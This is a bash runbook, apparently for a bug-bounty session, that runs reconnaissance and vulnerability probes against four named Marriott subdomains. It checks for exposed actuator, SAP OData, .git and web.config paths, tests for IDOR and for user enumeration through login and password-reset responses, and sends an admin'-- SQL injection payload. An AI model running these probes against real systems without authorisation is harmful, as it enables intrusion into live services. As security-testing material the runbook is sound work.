#!/usr/bin/env bash
# Session 13 — Four-Target Hunt Runbook
# Targets: gatewaydsapdev2 (M005), esupplier (M001), eidhelp (M010), bpa2 (M012)
# Run: bash PI-RUNBOOK-session13-four-targets.sh 2>&1 | tee /tmp/s13-output.txt
# Date: 2026-06-22
# Rules: max 20 req/s, GET/read-only only, no >10k request fuzzing

OUTDIR="$HOME/bbh/results/marriott/s13"
mkdir -p "$OUTDIR"

probe() {
  local url="$1"
  local result
  result=$(curl -sk -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
    --max-time 10 "$url" 2>/dev/null)
  echo "$result|$url"
}

fetch() {
  local url="$1"
  curl -sk -i --max-time 15 "$url" 2>/dev/null | head -80
}

echo "======================================================================"
echo "SESSION 13 — FOUR-TARGET HUNT"
echo "Date: $(date -u)"
echo "======================================================================"

# ==============================================================================
# TARGET 1: gatewaydsapdev2.marriott.com (M005 — SAP DEV Gateway, CRITICAL)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 1: gatewaydsapdev2.marriott.com (SAP DEV Gateway) ==="
echo "======================================================================"

BASE="https://gatewaydsapdev2.marriott.com"

echo ""
echo "--- 1A. Spring Boot Actuator ---"
for path in /actuator /actuator/health /actuator/env /actuator/info \
            /actuator/beans /actuator/mappings /actuator/heapdump \
            /actuator/logfile /actuator/metrics /actuator/configprops \
            /actuator/trace /actuator/dump /actuator/httptrace; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1B. SAP-Specific Paths ---"
for path in /sap/public/ping /sap/bc/ping /sap/bc/rest/ \
            /sap/opu/odata/ /sap/opu/odata4/ \
            /sap/bc/adt/ /sap/bc/adt/core/locks \
            /sap/hana/xs/ /gateway.svc "/gateway.svc/\$metadata" \
            /sap/opu/odata/SAP/ /sap/opu/odata/sap/ \
            /sap/bc/webdynpro/ /sap/bc/gui/sap/its/webgui; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1C. Swagger / OpenAPI ---"
for path in /swagger-ui.html /swagger-ui/ /swagger-ui/index.html \
            /v2/api-docs /v3/api-docs /openapi.json /openapi.yaml \
            /api-docs /api/swagger.json /swagger.json /api/v1/swagger.json; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1D. Generic Admin/Debug ---"
for path in /admin /console /debug /health /info /status /metrics \
            /config /env /api /api/v1 /api/v2 /management \
            /manager/html /host-manager/html /jmx-console; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 1E. Fetch live paths (200/401/403) in full ---"
for path in /sap/public/ping /sap/opu/odata/ /actuator/health /health /info; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
  fi
done

echo ""
echo "--- 1F. OData metadata (key SAP finding) ---"
for path in "/sap/opu/odata/\$metadata" /sap/opu/odata4/sap/ \
            "/odata/\$metadata" "/odata/v2/\$metadata" "/odata/v4/\$metadata"; do
  echo "Probing: ${BASE}${path}"
  curl -sk -i --max-time 10 "${BASE}${path}" | head -30
  echo "---"
done

echo ""
echo "--- 1G. HTTP methods on root ---"
for method in OPTIONS HEAD TRACE PUT DELETE PATCH; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "$method" \
    --max-time 5 "${BASE}/")
  echo "METHOD=$method status=$code"
done

# ==============================================================================
# TARGET 2: esupplier.marriott.com (M001 — Supplier Portal, CRITICAL)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 2: esupplier.marriott.com (Supplier Portal) ==="
echo "======================================================================"

BASE="https://esupplier.marriott.com"

echo ""
echo "--- 2A. Root page analysis ---"
curl -sk -i "${BASE}/" | head -60
echo ""
echo "--- 2A2. Root page content mining ---"
curl -sk "${BASE}/" | python3 -c "
import sys, re
html = sys.stdin.read()
forms   = re.findall(r'action=[\"\'](.*?)[\"\'`]', html, re.I)
scripts = re.findall(r'src=[\"\'](.*?\.js[^\"\']*)[\"\'`]', html, re.I)
apis    = re.findall(r'[\"\'](/(?:api|odata|rest|svc)/[^\"\']{2,60})[\"\'`]', html, re.I)
links   = list(set(re.findall(r'href=[\"\'](/[^\"\']{2,60})[\"\'`]', html, re.I)))
print('FORMS:', forms[:10])
print('SCRIPTS:', scripts[:10])
print('API_REFS:', sorted(set(apis))[:20])
print('LINKS:', sorted(set(links))[:25])
print('SIZE:', len(html))
"

echo ""
echo "--- 2B. ASP.NET / IIS specific ---"
for path in /elmah.axd /trace.axd /WebResource.axd /Glimpse.axd \
            /web.config /web.config.bak /Web.config /.git/HEAD \
            /app_offline.htm /packages.config /global.asax /Global.asax; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2C. API endpoints ---"
for path in /api/ /api/v1/ /api/v1/suppliers /api/v1/invoices \
            /api/v1/orders /api/v1/users /api/v1/contracts \
            /api/v1/purchase-orders /api/v2/ /odata/ "/odata/\$metadata" \
            /services/ /rest/ /webapi/; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2D. Auth / admin paths ---"
for path in /login /Login /Account/Login /signin /auth /admin \
            /Admin /management /dashboard /Dashboard \
            /Default.aspx /Login.aspx /Home.aspx /Supplier.aspx; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 2E. Fetch any live non-redirect paths ---"
for path in /api/ /api/v1/ /api/v1/suppliers /odata/ /elmah.axd \
            /trace.axd /.git/HEAD /web.config; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
  fi
done

echo ""
echo "--- 2F. NTLM/Windows auth probe ---"
curl -sk -I "${BASE}/" | grep -i "www-authenticate\|negotiate\|ntlm\|realm" || echo "no auth header"
curl -sk --ntlm -u ":" "${BASE}/" -I | head -20

echo ""
echo "--- 2G. IDOR test on any numeric ID endpoint found ---"
# If /api/v1/suppliers/1 is live, test 2 and 3
for id in 1 2 3 100 999; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${BASE}/api/v1/suppliers/${id}")
  echo "suppliers/$id → HTTP $code"
done

# ==============================================================================
# TARGET 3: eidhelp.marriott.com (M010 — Employee Identity, HIGH)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 3: eidhelp.marriott.com (Employee Identity Help) ==="
echo "======================================================================"

BASE="https://eidhelp.marriott.com"

echo ""
echo "--- 3A. Root page ---"
curl -sk -i "${BASE}/" | head -60
echo ""
echo "--- 3A2. Content mining ---"
curl -sk "${BASE}/" | python3 -c "
import sys, re
html = sys.stdin.read()
forms  = re.findall(r'<form[^>]*>(.*?)</form>', html, re.S|re.I)
inputs = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
apis   = re.findall(r'[\"\'](/(?:api|rest|svc|service)/[^\"\']{2,60})[\"\'`]', html, re.I)
print('FORM_INPUTS:', inputs[:15])
print('API_REFS:', sorted(set(apis))[:15])
print('SIZE:', len(html))
" 2>/dev/null

echo ""
echo "--- 3B. Path probe ---"
for path in /api/ /api/v1/ /api/v1/users /api/v1/employees /api/v1/lookup \
            /reset /reset-password /forgot-password /unlock \
            /help /admin /health /status /info /robots.txt \
            /api/employee /api/eid /lookup /identify; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 3C. User enumeration test on any reset/lookup endpoint ---"
# Test email-based lookup: different response = user enum
for email in "test@marriott.com" "invalid-zzz999@marriott.com" "admin@marriott.com"; do
  code=$(curl -sk -o /tmp/eid_resp_$$.txt -w "%{http_code}" \
    "${BASE}/forgot-password?email=${email}" --max-time 8 2>/dev/null)
  size=$(wc -c < /tmp/eid_resp_$$.txt 2>/dev/null || echo 0)
  echo "email=$email → HTTP $code / ${size}B"
  rm -f /tmp/eid_resp_$$.txt
done

echo ""
echo "--- 3D. POST to any reset endpoint ---"
for path in /reset /reset-password /forgot-password /api/v1/reset; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=test@marriott.com" \
    "${BASE}${path}" --max-time 8)
  echo "POST $path → HTTP $code"
done

# ==============================================================================
# TARGET 4: bpa2.marriott.com (M012 — BPA2 Portal, HIGH)
# ==============================================================================
echo ""
echo "======================================================================"
echo "=== TARGET 4: bpa2.marriott.com (BPA2 Portal) ==="
echo "======================================================================"

BASE="https://bpa2.marriott.com"

echo ""
echo "--- 4A. Follow redirect chain ---"
curl -skL -i --max-time 15 "${BASE}/" | head -80

echo ""
echo "--- 4B. Login page analysis ---"
curl -sk -i "${BASE}/Login/Login" | head -60
echo ""
curl -sk "${BASE}/Login/Login" | python3 -c "
import sys, re
html = sys.stdin.read()
inputs  = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'`][^>]*>', html, re.I)
forms   = re.findall(r'action=[\"\'](.*?)[\"\'`]', html, re.I)
hidden  = re.findall(r'type=[\"\'`]?hidden[\"\'`]?[^>]*name=[\"\'](.*?)[\"\'`]', html, re.I)
print('FORM_INPUTS:', inputs[:15])
print('FORM_ACTIONS:', forms[:5])
print('HIDDEN_FIELDS:', hidden[:10])
print('SIZE:', len(html))
" 2>/dev/null

echo ""
echo "--- 4C. Pre-auth path probe ---"
for path in /robots.txt /sitemap.xml /api/ /api/v1/ /health /status \
            /swagger /v2/api-docs /.git/HEAD /web.config \
            /Admin/ /admin/ /Management/ /Content/ /Scripts/ \
            /Login/ /Account/ /Register/ /api/values; do
  probe "${BASE}${path}"
done

echo ""
echo "--- 4D. Fetch live pre-auth paths ---"
for path in /robots.txt /sitemap.xml /api/ /api/v1/ /health /.git/HEAD; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${BASE}${path}")
  if [[ "$code" =~ ^(200|401|403)$ ]]; then
    echo "=== LIVE: ${BASE}${path} (HTTP $code) ==="
    fetch "${BASE}${path}"
  fi
done

echo ""
echo "--- 4E. Login form test (boolean diff for user enum) ---"
r1=$(curl -sk -o /tmp/bpa2_r1_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=wrongpass" "${BASE}/Login/Login" --max-time 10)
s1=$(wc -c < /tmp/bpa2_r1_$$.txt 2>/dev/null || echo 0)

r2=$(curl -sk -o /tmp/bpa2_r2_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistent_zzz999@x.com&password=wrongpass" "${BASE}/Login/Login" --max-time 10)
s2=$(wc -c < /tmp/bpa2_r2_$$.txt 2>/dev/null || echo 0)

echo "Login(admin/wrong):      HTTP $r1 / ${s1}B"
echo "Login(nonexistent/wrong): HTTP $r2 / ${s2}B"
if [ "$s1" != "$s2" ] || [ "$r1" != "$r2" ]; then
  echo "*** DIFFERENTIAL DETECTED — user enumeration candidate ***"
  echo "=== Response 1 (admin) ==="
  head -20 /tmp/bpa2_r1_$$.txt
  echo "=== Response 2 (nonexistent) ==="
  head -20 /tmp/bpa2_r2_$$.txt
fi
rm -f /tmp/bpa2_r1_$$.txt /tmp/bpa2_r2_$$.txt

echo ""
echo "--- 4F. SQL injection probe on login (safe boolean only) ---"
r3=$(curl -sk -o /tmp/bpa2_sqli_$$.txt -w "%{http_code}" \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'--&password=x" "${BASE}/Login/Login" --max-time 10)
s3=$(wc -c < /tmp/bpa2_sqli_$$.txt 2>/dev/null || echo 0)
echo "Login(admin'--/x): HTTP $r3 / ${s3}B"
if [ "$r3" = "200" ] && [ "$s3" -gt 1000 ]; then
  echo "*** POSSIBLE SQLi — 200 on malformed input with large response ***"
  head -30 /tmp/bpa2_sqli_$$.txt
elif [ "$r3" = "500" ]; then
  echo "*** POSSIBLE SQLi — 500 error on quote injection ***"
  head -30 /tmp/bpa2_sqli_$$.txt
fi
rm -f /tmp/bpa2_sqli_$$.txt

echo ""
echo "======================================================================"
echo "=== SESSION 13 COMPLETE: $(date -u) ==="
echo "=== Output: /tmp/s13-output.txt ==="
echo "======================================================================"
echo ""
echo "=== TRIAGE GUIDE ==="
echo "HIGH VALUE SIGNALS TO REPORT:"
echo "  - Any 200 on /actuator/env, /actuator/heapdump, /sap/opu/odata/ → CRITICAL"
echo "  - Any /api/v1/suppliers returning data unauthenticated → HIGH IDOR"
echo "  - Login response size differential → user enumeration"
echo "  - SQLi: HTTP 500 on admin'-- or 200 with auth success → Critical"
echo "  - /.git/HEAD returning 200 → source code exposure"
echo "  - Any OData \$metadata 200 → SAP schema exposure"
echo ""
echo "COPY /tmp/s13-output.txt AND PASTE OUTPUT BACK"
